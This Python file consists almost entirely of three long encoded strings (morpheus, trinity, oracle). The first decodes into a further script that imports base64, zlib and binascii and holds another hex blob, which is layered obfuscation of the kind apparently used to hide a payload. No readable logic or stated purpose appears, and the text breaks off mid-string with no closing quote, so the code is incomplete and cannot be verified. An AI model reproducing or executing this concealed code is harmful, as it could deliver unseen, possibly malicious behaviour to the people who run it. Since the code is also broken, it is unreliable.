import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhNzk3NDY1Mzk3NDc5NmYzMTcxMzIzNTY2NzYyYjY5NzYzMjU3NTY2NDQ1NTY0YTM3Njg0OTUwNzU2ZDQ5NzI2ZjM1NDE0MzY1NDk2OTZjNmQ1MTQ1NDU2ODVhNTI0YzdhNDk3MDc5Nzc0OTY4Njc2Mzc1NTk3OTM5NjYzMzQ3NDI1MDZlMzM2YzU1NmU0Yjc2NzE3MDQ4N2E0OTc3NTk2YzMzNmQ2ZDc2NjMzMTc4Mzg3ODRjNTY2NDJmNjY1MDMzMzUyZjRmNjYzNzdhMzk0NDQ0MzczMjJiMmYzNTJmNjU2MzcwMmYyYjY0NzY3NjMxNTgzMzM5MmY3Mjc0MzE1MDM3N2EzOTM3MmYyZjJmNzUzMjU5MzY3NDMyNGM0NzU3NjkyYjQ3Mzc3YTZjNzg3MzM1NTkyZjJiNmE0ZjcwMzY3MTc2NDQzNTY2NzU2NjQ0NDE2NTc5Nzk3ODY0NmEyYjQ3NTA3ODY1NTc1OTdhNzY0NjM5NTg1MjJmNmEzNzcwNzc2MjMxMzk2ZDUwNjMyZjMyNDI2NTY0MzM1MjMzNjU3NjM1NTk0NDMzMzY1MDJmNDEzMTMyNjIzNjc0NzgzOTRhNjMzMjdhNzQ3YTU4NTM2YzdhNmU2NTc5MzY2NDU4NTU1OTZjNTgzMjU5NzI3ODRlMzg0YzJmNGE2NTZhNTM1NzY1NzE3MzUwMzc3NTRjNDY1NjZhMmIzODZkNmU3MzRlMzY2YTQ1Nzk1YTU4MzU1MzQ3NDc3NjRlNzg1MDY2NzEzNjQ3NmUyYjJiNTk1MTMzNmE2YjQyN2E2ZDYxNzQ3ODcwNzE3NDY5NGUzNjM5NTE3ODMxMmI0ZTc1NzY2ODM2NTY3MDcwNGM3MzczNjgzNDY0NjI1NjMwNDU0NjM2Nzg3MDRiNmU3NDM3NTg2MjczMzc1MDczNzUzMTM3NTg1MDY1NzU0MzM0Njk0OTMwNzUzMjQyNjU2MTUwNmQyYjUyNjc1OTRiMzY3ODc0NzE1MDM1MzI2YzU2NjE0MjZlNzI1Nzc4NjMzNDM4NGE0Yzc2NWE3NTZlNDE3NzQ0MmY1MTZiNmQ0NjM4NjM1YTc1NzQ0NTYxNjU3NTQ1NjQ0NTY2MzQyZjY1NjM2MjYxNGQ0YzM0NjczNjVhNDE0YzM5NjE3NjUxNGIyYjJiNzM1ODRkNGUzNjJmNDkzNTU0NDQ1NDZhMzM0ZDZjMzU3NzRjNmY3YTU2NjY2ZDY3MzY3YTQyNTQzNDMxNmU2NjRhNDU0NzQ2NzYzNDMxNGU3NzZhNDc1OTU4MzI1NDc5NjY2YjY3Nzk3MjRmNzY3YTRlMzU3OTVhMmYzNzRhNTM2YTUxNzIzODY5NjI2NzUwMzM2ZDU3NjU0MzYyMzY0Mjc0MzI2NDQ0NDY1NzcxNzU3OTRkMmI1MjY0NDk0ZDc1NzI0OTc0MzUzMjY5NDU0MjcyMzIzMjZjNjI2NTc5NDQ2YTZlMzE3ODU0NzY0NDU4Mzk2YTU4NzM0Mjc4NzAzMjUwNDM2NjRmNTk1MjZlNjc0ZDJmNjE3OTQ0NGM3ODZhNDQ1NTY2NGM1MzRhNjY2ODYxNDk2NDc4NGUzMDQyNjU3ODZkNDUzODU5NDYzMjYzNzM1NjQxMzY2NTQ0NTE2MzY5NmM3YTZlMmI2MTY2Mzk2MzYyNTk3ODZkNmY2YzYzNzU0ZTJmNmYzNjRkNmY0NzMzMzc2ZTQ4NmQ0YzMyNzQ3MTM1MzM0YTJmNjQ2Mzc1MzU1NTZjNWEzNzMzNjgyYjZlNmQzMDZiNmE1NDY5NmU0MTU4NmQzOTcyNjUzMzYzMzM0NjQ0NGY3NzcxNjQ0OTQ2MzczNjU0NTgzMjRmNzAzNDUxNzc0NzM1NGI3MzY0NjU1MDM3Nzg3YTUwMzEzMDU3NTM1MDRhNTM3NTcwNTA1YTc1NGU2MzZjNTUyZjM5MzY1MzQ2NmUzNDMxNDI0MTJmNzE0MTY2MzMzODQyMzM0MzMzNzc0NzU4MzI3YTc1NzUzODY2MzY0NTY1Njk0MzZlNDU2MzQ4NjY0ZjUyMmI0NTY2Njk0MzM5NTc3YTc5NDY1NzRlNzMzMzM1NTM3ODRlNzM1OTU2NDc2NTZiNDI1MDM2NDM0ODcxNTk0ZjdhNTI2NzRlNmI0NDM3MzU2YzZjNTk3OTZjN2E2YzU0NmI0MzM5NWE3ODQ0MmI1MTU0Mzk1MTRiMzY3NDQ5NjYzODQ5NDI2NjcxNjk3MTc1Nzc0Yzc1Njc3MjcxNGYyZjUxNTEyZjc2NDE2NDU1NzY2ZjM4MzY2OTRiNDM0ODcxNDY3Mzc5NTg1MTRiMmI3MDc2NjM1OTQxNjQ2YjQ2MmY2MzMzMzQ0NjYzNGQ0MjM1Mzg2ZTYzNjI2YjZkNzY0MTY0Mzg2YzUzNTU2ODMwMzM1YTM0NmM2YzQyNDQ3NTRmMzI1NzUwNGQ0ZDUwNGIzOTRlNDc1MzZlNTM1MjYyMzA3NzMxNjkzNzU3NmY2NDc3NTQzNjQ1NDE0MzJiMzY2ODMyMzE0MjUwNTk0NDY2NTM0ZTc2NDg0MTc4MzMzNDM1MzAzNjY4NzYzMTY0NWEzMjUxN2EyYjUxNTYzMTY4NzA3MDQ2Mzk1MTZhMzI2ZDczNDU2NjYxNDQyYjUxNzkzODU0MzI2ODQ4NjU1MjU5MzY2YzQ0NzY3NjU0Nzc1NzJmNDk0YzM3NzU0YjY2NzQ2YjM3NTg2NTY5NmM0ODZmNDU1NzZhNDk0ZjM4N2E2ZTY4NDM3YTc3NzMzMTM2NTY0NjQ2NjU2YjUxNjU0Mjc2NmM0YTUwNTY0NjMyNGU0YTRhNjY2ODdhNDU0MzZhNTI2MjM0NTMzNzM3MzY3NTc1NjczNjM5NTc1MTZiMmYzNzZiNGYzNzYzNDg1MzRkNmE3Mzc5NjE0NTJiNWE0NDY2NzQ1MDM4NGQyZjRmNjk2YTU4Mzk3OTQ4Njc1OTY1NDMzNzUyNzQ3YTQ3NDg0ODU5NGE0ZjM4NTA1MjUxNzE0MjZlMzU3NDRjNDg0MjJmMzk1NDUyNzg1NjJmNTk0ZjMwNTAzNDZkNjU0MTM3NjY0MTY2Mzg0MjJiNTE0NTc2NTk2NDY1NTk2NDM1NDE3NTc0NjI1NTMzMzA1MjY4NmU3MDcwNTAzOTY3NGYyYjUxNDYyZjU3NmM0MjJmNmQ1MTc3Mzk0MjY2Mzg1NDMxNjU3NTc3MzMzNjUxNmU2YzUzNTQzOTU1NmM0MzYyMzk0NjUwNTI1YTM5NDkzMzJiNTE0ZjUxNGYyZjMzNGY0MTJmNzc0NjY2NTk0MzJiNTE0YjJmMzE0NTY3NzY2YjU2NjI1MjQ4NzI1NTY2Mzk0NzM3NDk3NTdhNzE1NTU0NTc0MjZjMmY0MTRjMmY3NDRkMmY2MTU4MmY0NTcwNzE2NzVhMzc1MjU0MzY0YzMyNjk3NjM4NDk2MTQ2NzMzODc4Njk3MDJiNjg0YzZlNDM3MzU0NjI2YjM0NmY0YTc2MmI0ZDYzNGE1NDU1NTE2MzY3NjYyYjY3NDY2NTU3MzE2YTYyMzk2YTUwNjg2ZTM3NTI0YTZjMzE3MTczNmE2ZDRkNjc2YTM3NDEzMzcxNmMyZjZhNzU2YTY1MzU0MTM5NDE2NjMwNTUzNzY3NzgzOTMyMzY1NjM5Nzg3YTZmNTIyYjQxMmI3NjQ0NGEzMjQyNjQzNjQyNjY3NDY5NzY0ZjY3MmYzMDZiMmI3NzMzNmE2Zjc5NjY1OTRiNzU2NjQ3Mzg2OTQxNGQyYjM1NDE0ZTM1NDY1OTc3NGMzMDRiNzU0MzY2NDk1MTY2NzM2MzQ3NTA0NTY2NTk0NzJiNzE2Njc4NmY2YjY1NTg2NDUxNTYzNzcwNmUzNjM2NDQ3NjMzNGQ2YTQ4MzQ3OTQ1MzczMjMyNzc0MTc1NzM1MTdhMzA1NDMzNmY3Njc1MzQ2ZTY1NDg2NDRhNDI3NTMwNGM0NzM5MzA0YjM4NjQ0YjQ0NjY3MTU4Nzc0YTJiNTEzMjYzNWE0YTc4NTQzMTQ2MmY2MTc0MzU1MDc5NTkzNjMxNGM2ZTQ2NjYzMDRmMzk0ODRhNjIzMDc0Mzk0MzMzMzYzNzMwNTczNDcwMmI0YzcxNDcyZjMzMzE2MjMwNzAzNTQzNDIzODQ4NzM3NDJmNmE3MTY5NTg0MTMyNTI0MzY2NmM0ZjY2NmM0NzY2NTg0YTJmMzg2ODU2MzI2Njc5NTU2Njc3NDcyZjQ5NmE3NjM5Nzc2NDMzNzE2YjQ4Mzk0Njc2MzA1MTM3NTE3MjcyNDYyZjUxNDY2NzM5NTQ3MjQyNzg3MDM3MmI1MTZhMzk0MTQ2MmI2NTcwNGMzNTZkNTQ0YzQzMzI0YTdhN2E1YTJiNGM1ODc1NTYzNzZjMmY1MDQ2NTU1OTY5Mzk3MTMyNjkzOTMxNDI3NDQ5NGM0Zjc1Njg2ZTY4NjkyYjM2NmY0MTY2MzA3YTM0Nzc2YTM1NDE1ODM1NzE0MjY3NTA1MjVhMzY1NDM3N2E3NDdhNDg2NTQ1NGMzNDc0NDY1NjM0NzMzODQ5NjY2YzU3NGQ1NjM0N2E0YTVhMzI1MDUzNGEzNzQ2NzI2NzJmNjEyZjcwNmUzODU5NzE2MzJiNGIyYjM0NDI0Nzc5NDE2YzJmNzczNTM4NTAzNTQyNTg3MzY1Mzk0YjQ0Njg0ODQ3NTQ2NjZhNGQ3MjczNGMzNTRmNTczNjQxMmY1ODZiNzU2MzZiMzM2ODczNjc2YTM4MzQ2YTdhNzk3ODQ4NzYzNzQyMzMzMjM2NmY2YjM0NmE2NjZmNzA3NjY5NTYyYjQ3NDg1ODRkNmY1ODM4NmIzOTQ1NmUzNjM1NjkzNzc3NmUzNTcyMzI2NzQ4NjMzNDZjNDgzNTQzNzY2YTRkMmY2YjQxMzM3MDQyNzUzNjQyNTg2YTM3Njk0MTc4NmE1MDU0NjE0YTY1Njk2ODZlNzk2ZjZjNDY2ZDQzMzk1ODJmNzY1MjMzNzU0MjUwNTM1MjJmNzQ2YTc2N2E2ZDZiMzc3MTQ1Mzk2NTdhNTM2ZDRkMzU0YTRmNzU2YjY2NjE1MDY1NGQ3Njc5NDk2Njc4NjgyYjY1NTcyZjUyNGYzNTQ2NmM0OTUwNGU1ODcwNzY3ODU0Mzk2MTZmNDYzOTM2NTE2NDZmNTIyZjUzNDg0ZDZlNjI1ODc5MzM2NjQ3NzU2NjQ1NzczNTUxNjI1MTc4Nzc1MDM5NzM2NTc0NmY3NDQzMmY0NTYxMzYzNDQ2NjYyYjZkNTQ3NjMxNzgzNzZiNDg2ODY1NGQ0NDM1NTQ2ZTc5N2E1MTQzNjIyYjUxNTc0ODZhNDgzMDMzNDQ2ZjMxMmY3MjRhNmM3YTRhNjUzMDMwMzg2MzRhNGYzNzQ0NzQzMDQ0NGY2YTRkNTY2MzY4MzM2YjQxMzk2NDY5NjEzNDY4NDQzMDUzN2E0NzUwNTk2YTM0MzE3OTc2NmI0ZDc5NTM3NTQ1NDQzODdhNDQ3YTcwNGQzODc3NGMzODRkNTA2ODRlMzI2ODZlNjc0ZDJiNzM1Njc1NDU0MTY0NjM0ZjYyNzY0MjJiNGM2NDY4NjI0YzUzNzA2YzM0N2E2Mjc5NDQzOTZmMzk3NzZlMzU0MTQ0MzI3MzQ4NTA3MjcwMzI1MjUyN2E0YTRlMmI2ODZlNGE2YTdhMzA2NDM4NGQ1MTZhMmY3MDYzNjcyYjMwNTgzNzQ3NmE2YTYzNjk0YTUwNjczNzM2MzY3OTRjMmI1NTQ3MmY3MDY0MzU0NzZhNTE0OTYyNDM0NjM4NTU1OTUwNTQ0YzUwNzk3OTZlNTA3OTYxMmY1YTQ1NmUyYjVhNDEzMzU1Mzg0ZDJiNTg0ZjcwMzg1Mjc2NmQzMzZiNTgyZjRiNDY0ZTY1NmI0MTU4NjE1OTQxMmY0YTdhMzE2OTRiNzk1MDc0NmIzMzQ1NmM0MTc2MzI0ZDRhMzc1MjY2Mzg0YzUxNTM2ZTY0NDEzNDU4NzY1MTQ3Mzk2ZTZmNTkzNDUzNjM2ZDJiMzU2YTRhNjU2MTZhMmY3Mzc0NjYzMjQxNmUzNTY4NjY1OTZlMmYzOTQzNGY2NzM5MzA3YTM3MzcyYjZlMmYzNDRiMmI3NTZjNDkyZjZiNGQ3NzU4N2E2ZjU3NmM3NjM4NjMyYjRhNmE0ZjUwNTQ0NjRhMzg0NDQ4Mzc0ZDUyMmYyYjY4NTQzMzMwNDg1MDZjNDg2Njc5NjY0YTZlNDU3MjU4NDk1MTY1NTM0YTc1Nzk0NDY5NTg2NTUzMzM3YTZlNzc1MDY1NzM2MTJmNDUzOTMxN2E2Yjc0MzY2MTY2NzA2ZTJiN2E0NzVhNjM2YzQ4Mzk0NzZkMmI0NTMwMmIyYjRkNzc3YTcyNzQ2NzQ4NjU2YjM0MzY3NzQyNjY2ZDQzNDk3YTcyNTk2ZTM4NTIzNTYxNTg1MjZlNmQ2ZTYyMzk0YjRkNWE3YTM0NGYzODY2Mzg1MDM0NGUzMTRjNzY0MTdhNmUzMzVhNDYyZjMwNDYyZjUxMzE3NDRjNzY2NDZhNDg2ZDUwNzg0MzUwNDc2NTJmNzY1ODM3MzY0MzY2Mzg1YTY'
trinity =  '2AzH0LmL1AzR0BQMzAQVlLwZlZzV0AGMyAQx2BGL1AwLlMwL1AwxlLwWvZzL0ZmZmA2R2AmEyAQtmAGp5AmNlMwEzA2R0ZmLmATD3BGH5ATHmAGHjZmN0ZmLmAQL1AQZjAwL2MQH3ZzL3AmD4ATR0AmEzAwH0MQDlZmHmAGpjAGR2MGHmZmRmAGp3AzD2Awp3ZmH1BGZmAQHmAGL5AzHmBGD5AQp0MGZ5AzL0AmWvAmR0LmH0AmH3AmMyZmxmAGLlA2R1AwWzA2R3LGEyAwZ2MGp2Awt0ZmWzAwp1BGZjAGLmBGIuAGNmAGD4AwL1ZwH2ZzV0MQEyZmL2ZGMvZmZmBQMuAGN2AGEvAQt1AQLlAQL2AQL5AGx3AQL5AmLmZGp3AGD2AQL3ATHlMwEyAzV0LwEzAmD0ZwHjAmp1BGL2AQx3LGquAQp3AQp5ZzV2MGD4AwR0LmWzAwZ0ZmWzAwV1AQMuAmVlMwMvAGZ0ZmZ1AGRmZwZ2AGR2MGZjAGN3LGMwAGN2AGH2AmRmZGZ0A2RmZQD2ZmDmZwMyAQt2LwL3Zmx2LGL2AwH2AmL2Zmp0BGL4Zmt2MQEzAmx1BQL1AGR3AwZ5AGx1AQH0AzZ3ZmpkAGN2LwEwAGL0MQLmAwp1AGZ0AwL3BQExZmx2ZwZkATZ1ZQWvAGZlLwZ5ZmD3LGZ2AQD2AGMxATZ3LGL2AGR0AGZ3AGR1ZQWzZmH0MGHjZmH0LGHjZzVmZQp1AwZmAGZkZmN0LwWzAzV3ZwpmAzH2MGLkAmR0AmEzZmxmAGH0A2R0LwD1Zmp3ZQD2ZmL3BQMyAmD2ZwEuAQtmAwD4AwD2LGMuAQL1BGWvAwR2MQp2ZzL1ZGL2AwZ1AGH0AQp3AmplZmt3BGMyZmZ1ZwpjATRmBQp4AmL0BGH2AwL1ZwEyZzVmAmD0ZzV3Amp2ZmH0LGD0AmV0ZmHjATL3BQEyZmp2BQZlATD2BGZ2AGV0LmZ1ATR2LGquAzH2LGMxAGD2MQExAmVmBQpkAmt0LmWzAGVmAGZ5AmH1ZmMyZmD0MwMxAGH3LGZmAQHmZGZ4ZzL2AwHjAmL3AQZ0ZzLmZGp5AmHmZmp3ATD3AGDkAQtlMwWzAmZmZmEyAwD0Zmp2AwRmAwZ0AmH2MwMyAzZ2MGMuZmR3ZwHmZmLmZwplAGV2ZmIuAQZ1ZwL0AwL2ZwH3AwxmZwL3Awx3ZwZ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'
oracle = 'M1NzUyNjg1OTM2NTI1YTZiNDMyZjQ4NmI3NzRkNzEzNzU2NDkzNzc4MmIzMDY4NDU2NzRhNTU3NDMzNzI2OTRhNDM0NTcyNmM2ZTQ2NTY0ZjU1Mzc0NzY5NGM1NzY4NzA3MDQ1NzQ2YzY3NzM2NzcyNjI3NjM1NTM0ZDUyNTI0NTZiNWE1ODRkNDE3OTc0Mzg3MjRhNTQ2ZjY3NzI3YTYxNDg0YzY2NDQ2NTc2N2E0ZjQzNmI2YTRhNjE3NjM3NDE3MTcwNDY1NTcwNGE0YzQ0NzE0OTZhMzQ0OTUzNzY0ZjQyNDI1NTM3NDUzNjZlNzE2OTUxNjg2YjU1NzU0NjZlNTY2NTU1NGM3NTVhNTU0YjczMzQ1MDM5Njk1NjY4NGI0MjU3MzA1NTUyNGE3MTQ5NDg0MjQ1NmI2ZTcyNjY2NzY2NmY0YTY3NDU3MzZiNjk2MTZkNmM3MzQyNDQ0NjZhNDI1OTRjMzg0YjYxNjQ0YjRmNDM3NjMwNzk2NjU5Nzk0OTYxNzMzODMzMzM2ZDYzNDU0NzQ5NGMzNTM5Mzk0ZTJiNzk1NDYyNDU3NjUwMzE2YTU2NTIzNjY5NDc3OTc3NjU2YjRmNDU2NzRhNTc2YzcxNTc3MjRlNzk2Nzc2NDc1NDMxNTU3OTU3Nzk3MjZhNDUzMzRhNTQ1MjU1NTE2YzVhMzA1MjQzNGU2YzRlNDY1MzY4NjMzMDQzNjY3OTY2NDU0NDQxNjk3NTY0NDU2ZjQzNDI1MTUyNzc1NjQ1NzE2ZTQ1NTE1NTU3NDIzMDMyNzA2NDRjNGM1MzZmNmU3NDU0MzU1NjZlNTE1OTY4NTkzNjYzNzk2ZTQzNjc2ZjUyNzY2OTUxNmU0NTczNmE0YjZlNTM2MTU2NzI0OTRiNTYyZjQ2NGI1NDc5NzA3MzY3NTI3NTQxNmE0YjM1MmI1NTZiMzMzMzU3NDI0YjZjNGU3MjQ1NmUyYjUyNGU2OTQ5NTc0YzQ4NzkzOTYxNzQ0Mzc5NDk3MTU4NTY0ZTM1N2E1MTYzNDE0ZjUyNDUzNTQ5NmMzNjQ0NWEzNTUzNjg1NjcwNGE1MjM4NmI1OTcxNjg0YjUyNTg0YTUxNjk3MDYzNTU3NDU1MzY1MzQxNTY0ZjZiNGY0MjY1NmI0YzQzNDM0MzRlNDU3NjQyNGY0ZjczNTQ1MjU2NTg1NjZmNzE2YjQzNzM1YTRiNGQ1Mzc0NjMyYjcxMmY3YTQ1NTQ2YjUzNzA0MzQ3NWEzNTQ4Nzg2NzVhNTY0YjUxNGY0NjU5MzI1Mzc5NGI1YTQ2NjU1MzczNjkyZjM1NGE2ODUzNmY1ODVhNDU3NzcxNzY1MzM0NzIzNjU0NzQ1NzQ5NDkzMDRhNDc1NjQzMzY0OTRkNTU0NjRiMzkzNDM0NTQzMDU3MzA1NDRjNDEzMjdhNDM2NTUzNGE0NzY2MmI1MTZiNDk2